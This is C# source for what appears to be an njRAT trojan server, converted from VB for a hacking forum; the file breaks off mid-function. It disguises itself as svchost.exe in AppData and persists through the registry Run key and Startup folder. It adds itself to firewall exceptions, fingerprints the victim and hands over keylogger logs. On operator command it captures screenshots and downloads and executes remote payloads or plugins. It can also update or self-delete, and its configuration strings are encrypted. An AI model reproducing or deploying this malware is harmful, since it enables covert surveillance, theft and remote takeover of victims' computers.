using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
// VB to C# by Tsunamii
// All Errors Are Fixed
// This Code For Dev-Point Team
// Skype: unlimitedkh
namespace NjServ_Csharp
{
    class OK

    {
        static OK()
        {
            // > You Can Remove The AES DecryptText And Add data Normally.
            System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden | FileAttributes.System); // > Super Hidden
            OK.VN = "SGFjS2VkIEJ5IFRzdW5hbWk=";
            //Victim Name
            OK.VR = Encryption.DecryptText("45n6XfXZIbxBn6vYPAzm5g==", "KIS");
            //Version
            OK.MT = null;
            OK.EXE = Encryption.DecryptText("Hp1WCdf3WSRSF3dk5jDMuQ==", "KIS"); // > svchost.exe
            // Install Name
            OK.DR = Encryption.DecryptText("kybZbZhVXLZH/HiYTSPTTA==", "KIS"); // > AppData
            // Path Name
            OK.RG = Encryption.DecryptText("vkppMSVVmk1rnlJFhC3lKw==", "KIS"); // > Name of installing In Startup And Regedit
            OK.H = "127.0.0.1";
            // Host
            OK.P = "1669";
            // Port
            OK.Y = Encryption.DecryptText("FxR6oTPY7P9HA3Q1a5PdiA==", "KIS"); // > You Can Change The Socket Key And Encrypt it using AES 
            // Socket Key
            OK.BD = Conversions.ToBoolean("False");
            //Protect Process
            Thread.Sleep(2000);
            OK.Idr = Conversions.ToBoolean("False");
            //Install Path
            OK.IsF = Conversions.ToBoolean("False");
            //Startup Copy
            Thread.Sleep(3000);
            OK.Isu = Conversions.ToBoolean("False");
            //Regedit Copy
            Thread.Sleep(3000);
            OK.LO = new FileInfo(Assembly.GetEntryAssembly().Location);
            OK.F = new Computer();
            OK.Cn = false;
            OK.sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            OK.C = null;
            OK.MeM = new MemoryStream();
            OK.lastcap = "";
            OK.PLG = null;
        }     

        //Feilds
        public static string VN;
        public static string VR;
        public static object MT;
        public static string EXE;
        public static string DR;
        public static string RG;
        public static string H;
        public static string P;
        public static string Y;
        public static bool BD;
        public static bool Idr;
        public static bool IsF;
        public static bool Isu;
        public static FileInfo LO;
        public static FileStream FS;
        public static Computer F;
        public static bool Cn;
        public static string sf;
        public static TcpClient C;
        public static MemoryStream MeM;
        public static byte[] b;
        public static string lastcap;
        public static object PLG;
        public static string Logs = "";
        public static kl kq = (kl)null;




        // > API Calls 
        [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

        [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

        [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern int GetWindowTextLength(long hwnd);






            
       
            public static void DLV(string n)
            {
                try
                {
                    OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG, true).DeleteValue(n);
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    ProjectData.ClearProjectError();
                }
            }

            public static object GTV(string n, object ret)
            {
                object obj;
                try
                {
                    obj = OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(ret));
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    obj = ret;
                    ProjectData.ClearProjectError();
                }
                return obj;
            }

            public static bool STV(string n, object t, RegistryValueKind typ)
            {
                bool flag;
                try
                {
                    OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(t), typ);
                    flag = true;
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    flag = false;
                    ProjectData.ClearProjectError();
                }
                return flag;
            }

            public static string inf()
            {
                string str2 = "ll" + OK.Y;
                try
                {
                    bool flag = !Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")), "", false);
                    if (flag)
                    {
                        string str3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")));
                        string str4 = OK.DEB(ref str3) + "_" + OK.HWD();
                        str2 = str2 + OK.ENB(ref str4) + OK.Y;
                    }
                    else
                    {
                        string str3 = OK.DEB(ref OK.VN) + "_" + OK.HWD();
                        str2 = str2 + OK.ENB(ref str3) + OK.Y;
                    }
                }
                catch (Exception expr_B1)
                {
                    ProjectData.SetProjectError(expr_B1);
                    string str4 = OK.HWD();
                    str2 = str2 + OK.ENB(ref str4) + OK.Y;
                    ProjectData.ClearProjectError();
                }
                try
                {
                    str2 = str2 + Environment.MachineName + OK.Y;
                }
                catch (Exception expr_EF)
                {
                    ProjectData.SetProjectError(expr_EF);
                    str2 = str2 + "??" + OK.Y;
                    ProjectData.ClearProjectError();
                }
                try
                {
                    str2 = str2 + Environment.UserName + OK.Y;
                }
                catch (Exception expr_125)
                {
                    ProjectData.SetProjectError(expr_125);
                    Exception exception2 = expr_125;
                    ProjectData.SetProjectError(exception2);
                    str2 = str2 + "??" + OK.Y;
                    ProjectData.ClearProjectError();
                }
                try
                {
                    str2 = str2 + OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") + OK.Y;
                }
                catch (Exception expr_17F)
                {
                    ProjectData.SetProjectError(expr_17F);
                    Exception exception3 = expr_17F;
                    ProjectData.SetProjectError(exception3);
                    str2 = str2 + "??-??-??" + OK.Y;
                    ProjectData.ClearProjectError();
                }
                str2 = str2 + "" + OK.Y;
                try
                {
                    str2 += OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
                }
                catch (Exception expr_22D)
                {
                    ProjectData.SetProjectError(expr_22D);
                    Exception exception4 = expr_22D;
                    ProjectData.SetProjectError(exception4);
                    str2 += "??";
                    ProjectData.ClearProjectError();
                }
                str2 += "SP";
                checked
                {
                    try
                    {
                        string[] strArrays = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
                        bool flag = strArrays.Length == 1;
                        if (flag)
                        {
                            str2 += "0";
                        }
                        str2 += strArrays[strArrays.Length - 1];
                    }
                    catch (Exception expr_2A3)
                    {
                        ProjectData.SetProjectError(expr_2A3);
                        Exception exception5 = expr_2A3;
                        ProjectData.SetProjectError(exception5);
                        str2 += "0";
                        ProjectData.ClearProjectError();
                    }
                    try
                    {
                        str2 = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (str2 + " x86" + OK.Y) : (str2 + " x64" + OK.Y));
                    }
                    catch (Exception expr_301)
                    {
                        ProjectData.SetProjectError(expr_301);
                        Exception exception6 = expr_301;
                        ProjectData.SetProjectError(exception6);
                        str2 += OK.Y;
                        ProjectData.ClearProjectError();
                    }
                    str2 = ((!OK.Cam()) ? (str2 + "No" + OK.Y) : (str2 + "Yes" + OK.Y));
                    str2 = str2 + OK.VR + OK.Y;
                    str2 = str2 + ".." + OK.Y;
                    str2 = str2 + OK.ACT() + OK.Y;
                    string str5 = "";
                    try
                    {
                        string[] valueNames = OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
                        int arg_3BD_0 = 0;
                        int num = valueNames.Length;
                        int i = arg_3BD_0;
                        while (true)
                        {
                            int arg_3F9_0 = i;
                            int num2 = num;
                            if (arg_3F9_0 > num2)
                            {
                                break;
                            }
                            string str6 = valueNames[i];
                            bool flag = str6.Length == 32;
                            if (flag)
                            {
                                str5 = str5 + str6 + ",";
                            }
                            i++;
                        }
                    }
                    catch (Exception expr_3FD)
                    {
                    }
                    return str2 + str5;
                }
            }

            public static string ENB(ref string s)
            {
                return Convert.ToBase64String(OK.SB(ref s));
            }

            public static string DEB(ref string s)
            {
                byte[] B = Convert.FromBase64String(s);
                return OK.BS(ref B);
            }

            public static byte[] SB(ref string S)
            {
                return Encoding.UTF8.GetBytes(S);
            }

            public static string BS(ref byte[] B)
            {
                return Encoding.UTF8.GetString(B);
            }

            public static byte[] Decompress(byte[] B)
            {
                MemoryStream memoryStream = new MemoryStream(B);
                GZipStream gzipStream = new GZipStream((Stream)memoryStream, CompressionMode.Decompress);
                byte[] buffer = new byte[4];
                memoryStream.Position = checked(memoryStream.Length - 5L);
                memoryStream.Read(buffer, 0, 4);
                int count = BitConverter.ToInt32(buffer, 0);
                memoryStream.Position = 0L;
                byte[] array = new byte[checked(count - 1 + 1)];
                gzipStream.Read(array, 0, count);
                gzipStream.Dispose();
                memoryStream.Dispose();
                return array;
            }

            public static bool Cam()
            {
                checked
                {
                    try
                    {
                        int num = 0;
                        while (true)
                        {
                            short arg_17_0 = (short)num;
                            string text = Strings.Space(100);
                            int arg_17_2 = 100;
                            string text2 = null;
                            if (OK.capGetDriverDescriptionA(arg_17_0, ref text, arg_17_2, ref text2, 100))
                            {
                                break;
                            }
                            num++;
                            if (num > 4)
                            {
                                goto Block_3;
                            }
                        }
                        return true;
                    Block_3: ;
                    }
                    catch (Exception expr_2C)
                    {
                        ProjectData.SetProjectError(expr_2C);
                        ProjectData.ClearProjectError();
                    }
                    return false;
                }
            }

            public static string ACT()
            {
                string str1;
                string str2;
                try
                {
                    IntPtr foregroundWindow = OK.GetForegroundWindow();
                    if (foregroundWindow == IntPtr.Zero)
                    {
                        str1 = "";
                    }
                    else
                    {
                        str2 = Strings.Space(checked(OK.GetWindowTextLength((long)foregroundWindow) + 1));
                        OK.GetWindowText(foregroundWindow, ref str2, str2.Length);
                        str1 = OK.ENB(ref str2);
                    }
                }
                catch (Exception ex)
                {
                    ProjectData.SetProjectError(ex);
                    str1 = "";
                    ProjectData.ClearProjectError();
                }
                return str1;
            }

            public static string HWD()
            {
                string result;
                try
                {
                    string text = Interaction.Environ("SystemDrive") + "\\";
                    string text2 = null;
                    int arg_2F_2 = 0;
                    int num = 0;
                    int num2 = 0;
                    string text3 = null;
                    int number = 0;
                    OK.GetVolumeInformation(ref text, ref text2, arg_2F_2, ref number, ref num, ref num2, ref text3, 0);
                    result = Conversion.Hex(number);
                }
                catch (Exception expr_3E)
                {
                    ProjectData.SetProjectError(expr_3E);
                    result = "ERR";
                    ProjectData.ClearProjectError();
                }
                return result;
            }

            public static object Plugin(byte[] b, string c)
            {
                Module[] modules = AppDomain.CurrentDomain.Load(b).GetModules();
                int num = 0;
                checked
                {
                    Module module;
                    Type type;
                    while (true)
                    {
                        module = modules[num];
                        Type[] types = module.GetTypes();
                        int num2 = 0;
                        do
                        {
                            type = types[num2];
                            bool flag = type.FullName.EndsWith("." + c);
                            if (flag)
                            {
                                goto Block_1;
                            }
                            num2++;
                        }
                        while (num2 < types.Length);
                        num++;
                        if (num >= modules.Length)
                        {
                            goto Block_3;
                        }
                    }
                Block_1:
                    object Plugin = module.Assembly.CreateInstance(type.FullName);
                    return Plugin;
                Block_3:
                    Plugin = null;
                    return Plugin;
                }
            }

            public static void ED()
            {
            }

            public static bool CompDir(FileInfo F1, FileInfo F2)
            {
                bool flag = Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0;
                bool CompDir;
                if (flag)
                {
                    CompDir = false;
                }
                else
                {
                    DirectoryInfo directoryInfo = F1.Directory;
                    DirectoryInfo directoryInfo2 = F2.Directory;
                    while (Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
                    {
                        directoryInfo = directoryInfo.Parent;
                        directoryInfo2 = directoryInfo2.Parent;
                        flag = (directoryInfo == null & directoryInfo2 == null);
                        if (flag)
                        {
                            CompDir = true;
                            return CompDir;
                        }
                        flag = (directoryInfo == null || directoryInfo2 == null);
                        if (flag)
                        {
                            CompDir = false;
                            return CompDir;
                        }
                    }
                    CompDir = false;
                }
                return CompDir;
            }


            public static void UNS()
            {
                OK.Isu = false;
                try
                {
                    OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
                }
                catch (Exception ex)
                {
                }
                try
                {
                    OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
                }
                catch (Exception ex)
                {
                }
                try
                {
                    Interaction.Shell("netsh firewall delete allowedprogram \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
                }
                catch (Exception ex)
                {
                }
                try
                {
                    if (OK.FS != null)
                    {
                        OK.FS.Dispose();
                        System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe");
                    }
                }
                catch (Exception ex)
                {
                }
                try
                {
                    OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RG, false);
                }
                catch (Exception ex)
                {
                }
                try
                {
                    Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
                }
                catch (Exception ex)
                {
                }
                ProjectData.EndApp();
            }

            public static void INS()
            {
                Thread.Sleep(1000);
                if (OK.Idr)
                {
                    if (!OK.CompDir(OK.LO, new FileInfo(Interaction.Environ(OK.DR).ToLower() + "\\" + OK.EXE.ToLower())))
                    {
                        try
                        {
                            if (System.IO.File.Exists(Interaction.Environ(OK.DR) + "\\" + OK.EXE))
                                System.IO.File.Delete(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
                            FileStream fileStream = new FileStream(Interaction.Environ(OK.DR) + "\\" + OK.EXE, FileMode.CreateNew);
                            byte[] array = System.IO.File.ReadAllBytes(OK.LO.FullName);
                            fileStream.Write(array, 0, array.Length);
                            fileStream.Flush();
                            fileStream.Close();
                            OK.LO = new FileInfo(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
                            Process.Start(OK.LO.FullName);
                            ProjectData.EndApp();
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
                try
                {
                    Interaction.Shell("netsh firewall add allowedprogram \"" + OK.LO.FullName + "\" \"" + OK.LO.Name + "\" ENABLE", AppWinStyle.Hide, true, 5000);
                }
                catch (Exception ex)
                {
                }
                if (OK.Isu)
                {
                    try
                    {
                        OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, (object)("\"" + OK.LO.FullName + "\" .."));
                    }
                    catch (Exception ex)
                    {
                    }
                   
                }
                if (!OK.IsF)
                    return;
                try
                {
                    System.IO.File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", true);
                    OK.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", FileMode.Open);
                }
                catch (Exception ex)
                {
                }
            }

            public static void Ind(byte[] b)
            {
                bool pLG = false;
                string[] strArrays = Strings.Split(OK.BS(ref b), OK.Y, -1, CompareMethod.Binary);
                checked
                {
                    try
                    {
                        string str = strArrays[0];
                        bool flag = Operators.CompareString(str, "ll", false) == 0;
                        if (flag)
                        {
                            OK.Cn = false;
                        }
                        else
                        {
                            flag = (Operators.CompareString(str, "kl", false) == 0);
                            if (flag)
                            {
                                OK.Send("kl" + OK.Y + OK.ENB(ref OK.Logs));
                            }
                            else
                            {
                                flag = (Operators.CompareString(str, "prof", false) == 0);
                                if (flag)
                                {
                                    string str2 = strArrays[1];
                                    flag = (Operators.CompareString(str2, "~", false) == 0);
                                    if (flag)
                                    {
                                        OK.STV(strArrays[2], strArrays[3], RegistryValueKind.String);
                                        pLG = true;
                                    }
                                    else
                                    {
                                        flag = (Operators.CompareString(str2, "!", false) == 0);
                                        if (flag)
                                        {
                                            OK.STV(strArrays[2], strArrays[3], RegistryValueKind.String);
                                            OK.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("getvalue" + OK.Y + strArrays[1] + OK.Y, RuntimeHelpers.GetObjectValue(OK.GTV(strArrays[1], ""))))));
                                            pLG = true;
                                        }
                                        else
                                        {
                                            flag = (Operators.CompareString(str2, "@", false) == 0);
                                            if (flag)
                                            {
                                                OK.DLV(strArrays[2]);
                                                pLG = true;
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    flag = (Operators.CompareString(str, "rn", false) == 0);
                                    if (flag)
                                    {
                                        bool flag2 = strArrays[2][0] != '\u001f';
                                        byte[] numArray = (byte[])OK.GTV(strArrays[1], new byte[0]);
                                        if (flag2)
                                        {
                                            WebClient webClient = new WebClient();
                                            try
                                            {
                                                numArray = webClient.DownloadData(strArrays[2]);
                                            }
                                            catch (Exception expr_1A6)
                                            {
                                                ProjectData.SetProjectError(expr_1A6);
                                                OK.Send("MSG" + OK.Y + "Download ERROR");
                                                OK.Send("bla");
                                                pLG = true;
                                                ProjectData.ClearProjectError();
                                            }
                                        }
                                        else
                                        {
                                            try
                                            {
                                                MemoryStream memoryStream = new MemoryStream();
                                                int length = (strArrays[0] + OK.Y + strArrays[1] + OK.Y).Length;
                                                memoryStream.Write(b, length, b.Length - length);
                                                numArray = OK.Decompress(memoryStream.ToArray());
                                            }
                                            catch (Exception expr_227)
                                            {
                                                ProjectData.SetProjectError(expr_227);
                                                OK.Send("MSG" + OK.Y + "Execute ERROR");
                                                OK.Send("bla");
                                                pLG = true;
                                                ProjectData.ClearProjectError();
                                            }
                                        }
                                        flag2 = !pLG;
                                        if (flag2)
                                        {
                                            flag = !pLG;
                                            if (flag)
                                            {
                                                OK.Send("bla");
                                                string str3 = Path.GetTempFileName() + "." + strArrays[1];
                                                try
                                                {
                                                    File.WriteAllBytes(str3, numArray);
                                                    Process.Start(str3);
                                                    OK.Send("MSG" + OK.Y + "Executed As " + new FileInfo(str3).Name);
                                                    pLG = true;
                                                }
                                                catch (Exception expr_2D6)
                                                {
                                                    ProjectData.SetProjectError(expr_2D6);
                                                    Exception exception3 = expr_2D6;
                                                    ProjectData.SetProjectError(exception3);
                                                    Exception exception4 = exception3;
                                                    OK.Send("MSG" + OK.Y + "Execute ERROR " + exception4.Message);
                                                    pLG = true;
                                                    ProjectData.ClearProjectError();
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        bool flag2 = Operators.CompareString(str, "inv", false) == 0;
                                        if (flag2)
                                        {
                                            byte[] numArray2 = (byte[])OK.GTV(strArrays[1], new byte[0]);
                                            flag2 = !(strArrays[3].Length < 0 & numArray2.Length == 0);
                                            if (flag2)
                                            {
                                                flag = (strArrays[3].Length > 0);
                                                string[] y;
                                                if (flag)
                                                {
                                                    MemoryStream memoryStream2 = new MemoryStream();
                                                    y = new string[]
											{
												strArrays[0],
												OK.Y,
												strArrays[1],
												OK.Y,
												strArrays[2],
												OK.Y
											};
                                                    int num = string.Concat(y).Length;
                                                    memoryStream2.Write(b, num, b.Length - num);
                                                    numArray2 = OK.Decompress(memoryStream2.ToArray());
                                                    OK.STV(strArrays[1], numArray2, RegistryValueKind.Binary);
                                                }
                                                y = new string[]
										{
											"pl",
											OK.Y,
											strArrays[1],
											OK.Y,
											Conversions.ToString(0)
										};
                                                OK.Send(string.Concat(y));
                                                object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(numArray2, "A"))));
                                                object[] h = new object[]
										{
											OK.H
										};
                                                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), null, "h", h, null, null);
                                                h = new object[]
										{
											OK.P
										};
                                                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), null, "p", h, null, null);
                                                h = new object[]
										{
											strArrays[2]
										};
                                                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), null, "osk", h, null, null);
                                                NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), null, "start", new object[0], null, null, null, true);
                                                while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject(!OK.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), null, "Off", new object[0], null, null, null)), true, false))))))
                                                {
                                                    Thread.Sleep(1);
                                                }
                                                h = new object[]
										{
											true
										};
                                                NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), null, "off", h, null, null);
                                                pLG = true;
                                            }
                                            else
                                            {
                                                string[] y = new string[]
										{
											"pl",
											OK.Y,
											strArrays[1],
											OK.Y,
											Conversions.ToString(1)
										};
                                                OK.Send(string.Concat(y));
                                                pLG = true;
                                            }
                                        }
                                        else
                                        {
                                            flag2 = (Operators.CompareString(str, "ret", false) == 0);
                                            if (flag2)
                                            {
                                                byte[] numArray3 = (byte[])OK.GTV(strArrays[1], new byte[0]);
                                                flag2 = !(strArrays[2].Length < 0 & numArray3.Length == 0);
                                                if (flag2)
                                                {
                                                    flag = (strArrays[2].Length > 0);
                                                    if (flag)
                                                    {
                                                        MemoryStream memoryStream3 = new MemoryStream();
                                                        int length2 = (strArrays[0] + OK.Y + strArrays[1] + OK.Y).Length;
                                                        memoryStream3.Write(b, length2, b.Length - length2);
                                                        numArray3 = OK.Decompress(memoryStream3.ToArray());
                                                        OK.STV(strArrays[1], numArray3, RegistryValueKind.Binary);
                                                    }
                                                    string[] y = new string[]
											{
												"pl",
												OK.Y,
												strArrays[1],
												OK.Y,
												Conversions.ToString(0)
											};
                                                    OK.Send(string.Concat(y));
                                                    object obj = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(numArray3, "A"))));
                                                    y = new string[]
											{
												"ret",
												OK.Y,
												strArrays[1],
												OK.Y,
												null
											};
                                                    string str4 = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), null, "GT", new object[0], null, null, null)));
                                                    y[4] = OK.ENB(ref str4);
                                                    OK.Send(string.Concat(y));
                                                    pLG = true;
                                                }
                                                else
                                                {
                                                    string[] y = new string[]
											{
												"pl",
												OK.Y,
												strArrays[1],
												OK.Y,
												Conversions.ToString(1)
											};
                                                    OK.Send(string.Concat(y));
                                                    pLG = true;
                                                }
                                            }
                                            else
                                            {
                                                flag2 = (Operators.CompareString(str, "CAP", false) == 0);
                                                if (flag2)
                                                {
                                                    int width = Screen.PrimaryScreen.Bounds.Width;
                                                    Rectangle bounds = Screen.PrimaryScreen.Bounds;
                                                    Bitmap bitmap = new Bitmap(width, bounds.Height, PixelFormat.Format16bppRgb555);
                                                    Graphics graphic = Graphics.FromImage(bitmap);
                                                    Size size = new Size(bitmap.Width, bitmap.Height);
                                                    graphic.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
                                                    try
                                                    {
                                                        Cursor @default = Cursors.Default;
                                                        Point position = Cursor.Position;
                                                        size = new Size(32, 32);
                                                        bounds = new Rectangle(position, size);
                                                        @default.Draw(graphic, bounds);
                                                    }
                                                    catch (Exception expr_893)
                                                    {
                                                        ProjectData.SetProjectError(expr_893);
                                                        Exception exception5 = expr_893;
                                                        ProjectData.SetProjectError(exception5);
                                                        ProjectData.ClearProjectError();
                                                    }
                                                    graphic.Dispose();
                                                    Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArrays[1]), Conversions.ToInteger(strArrays[2]));
                                                    graphic = Graphics.FromImage(bitmap2);
                                                    graphic.DrawImage(bitmap, 0, 0, bitmap2.Width, bitmap2.Height);
                                                    graphic.Dispose();
                                                    MemoryStream memoryStream4 = new MemoryStream();
                                                    string str4 = "CAP" + OK.Y;
                                                    b = OK.SB(ref str4);
                                                    memoryStream4.Write(b, 0, b.Length);
                                                    MemoryStream memoryStream5 = new MemoryStream();
                                                    bitmap2.Save(memoryStream5, ImageFormat.Jpeg);
                                                    string str5 = OK.MD5(memoryStream5.ToArray());
                                                    flag2 = (Operators.CompareString(str5, OK.lastcap, false) == 0);
                                                    if (flag2)
                                                    {
                                                        memoryStream4.WriteByte(0);
                                                    }
                                                    else
                                                    {
                                                        OK.lastcap = str5;
                                                        memoryStream4.Write(memoryStream5.ToArray(), 0, (int)memoryStream5.Length);
                                                    }
                                                    OK.Sendb(memoryStream4.ToArray());
                                                    memoryStream4.Dispose();
                                                    memoryStream5.Dispose();
                                                    bitmap.Dispose();
                                                    bitmap2.Dispose();
                                                    pLG = true;
                                                }
                                                else
                                                {
                                                    flag2 = (Operators.CompareString(str, "un", false) == 0);
                                                    if (flag2)
                                                    {
                                                        string str6 = strArrays[1];
                                                        flag2 = (Operators.CompareString(str6, "~", false) == 0);
                                                        if (flag2)
                                                        {
                                                            OK.UNS();
                                                            pLG = true;
                                                        }
                                                        else
                                                        {
                                                            flag2 = (Operators.CompareString(str6, "!", false) == 0);
                                                            if (flag2)
                                                            {
                                                                ProjectData.EndApp();
                                                                pLG = true;
                                                            }
                                                            else
                                                            {
                                                                flag2 = (Operators.CompareString(str6, "@", false) == 0);
                                                                if (flag2)
                                                                {
                                                                    Process.Start(OK.LO.FullName);
                                                                    ProjectData.EndApp();
                                                                    pLG = true;
                                                                }
                                                            }
                                                        }
                                                    }
                                                    else
                                                    {
                                                        flag2 = (Operators.CompareString(str, "up", false) == 0);
                                                        if (flag2)
                                                        {
                                                            byte[] numArray4 = null;
                                                            flag2 = (strArrays[1][0] != '\u001f');
                                                            if (flag2)
                                                            {
                                                                WebClient webClient2 = new WebClient();
                                                                try
                                                                {
                                                                    numArray4 = webClient2.DownloadData(strArrays[1]);
                                                                }
                                                                catch (Exception expr_A9A)
                                                                {
                                                                    ProjectData.SetProjectError(expr_A9A);
                                                                    Exception exception6 = expr_A9A;
                                                                    ProjectData.SetProjectError(exception6);
                                                                    OK.Send("MSG" + OK.Y + "Update ERROR");
                                                                    OK.Send("bla");
                                                                    pLG = true;
                                                                    ProjectData.ClearProjectError();
                                                                }
                                                            }
                                                            else
                                                            {
                                                                try
                                                                {
                                                                    MemoryStream memoryStream6 = new MemoryStream();
                                                                    int num2 = (strArrays[0] + OK.Y).Length;
                                                                    memoryStream6.Write(b, num2, b.Length - num2);
                                                                    numArray4 = OK.Decompress(memoryStream6.ToArray());
                                                                }
                                                                catch (Exception expr_B1B)
                                                                {
                                                                    ProjectData.SetProjectError(expr_B1B);
                                                                    Exception exception7 = expr_B1B;
                                                                    ProjectData.SetProjectError(exception7);
                                                                    OK.Send("MSG" + OK.Y + "Update ERROR");
                                                                    OK.Send("bla");
                                                                    pLG = true;
                                                                    ProjectData.ClearProjectError();
                                                                }
                                                            }
                                                            flag2 = !pLG;
                                                            if (flag2)
                                                            {
                                                                flag = !pLG;
                                                                if (flag)
                                                                {
                                                                    OK.Send("bla");
                                                                    string str7 = Path.GetTempFileName() + ".exe";
                                                                    try
                                                                    {
                                                                        OK.Send("MSG" + OK.Y + "Updating To " + new FileInfo(str7).Name);
                                                                        Thread.Sleep(-198200);
                                                                        File.WriteAllBytes(str7, numArray4);
                                                                        Process.Start(str7, "..");
                                                                    }
                                                                    catch (Exception expr_BDD)
                                                                    {
                                                                        ProjectData.SetProjectError(expr_BDD);
                                                                        Exception exception8 = expr_BDD;
                                                                        ProjectData.SetProjectError(exception8);
                                                                        Exception exception9 = exception8;
                                                                        OK.Send("MSG" + OK.Y + "Update ERROR " + exception9.Message);
                                                                        pLG = true;
                                                                        ProjectData.ClearProjectError();
                                                                    }
                                                                    flag2 = !pLG;
                                                                    if (flag2)
                                                                    {
                                                                        OK.UNS();
                                                                        pLG = true;
                                                                    }
                                                                }
                                                            }
                                                        }
                                                        else
                                                        {
                                                            flag2 = (Operators.CompareString(str, "Ex", false) == 0);
                                                            if (flag2)
                                                            {
                                                                flag = (OK.PLG == null);
                                                                if (flag)
                                                                {
                                                                    OK.Send("PLG");
                                                                    int num3 = 0;
                                                                    while (!(OK.PLG != null | num3 == 2000 | !OK.Cn))
                                                                    {
                                                                        num3++;
                                                                        Thread.Sleep(-199200);
                                                                    }
                                                                    pLG = (OK.PLG == null | !OK.Cn);
                                                                }
                                                                flag2 = !pLG;
                                                                if (flag2)
                                                                {
                                                                    object pLG2 = RuntimeHelpers.GetObjectValue(OK.PLG);
                                                                    object[] h = new object[]
															{
																b
															};
                                                                    object[] p = h;
                                                                    bool[] flagArray = new bool[]
															{
																true
															};
                                                                    NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(pLG2), null, "ind", p, null, null, flagArray, true);
                                                                    flag2 = flagArray[0];
                                                                    if (flag2)
                                                                    {
